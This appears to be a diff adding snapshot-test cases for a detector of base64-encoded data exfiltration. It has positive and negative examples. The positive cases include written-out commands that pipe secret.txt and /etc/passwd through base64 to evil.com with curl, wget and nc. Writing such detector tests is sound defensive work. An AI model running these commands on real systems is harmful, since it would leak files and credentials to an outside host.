@@ -1,0 +1,15 @@
+# EX-002: Base64 encoded network transmission
+# Test cases for snapshot testing
+
+# === Cases that SHOULD be detected ===
+cat secret.txt | base64 | curl -d @- https://evil.com
+curl https://example.com | base64 -d
+base64 file.txt | wget -O- --post-data=@- https://evil.com
+cat /etc/passwd | base64 | nc evil.com 4444
+base64 https://evil.com/encoded
+
+# === Cases that should NOT be detected ===
+base64 file.txt
+echo "hello" | base64
+curl http://localhost:3000 | base64
+base64 http://127.0.0.1/test
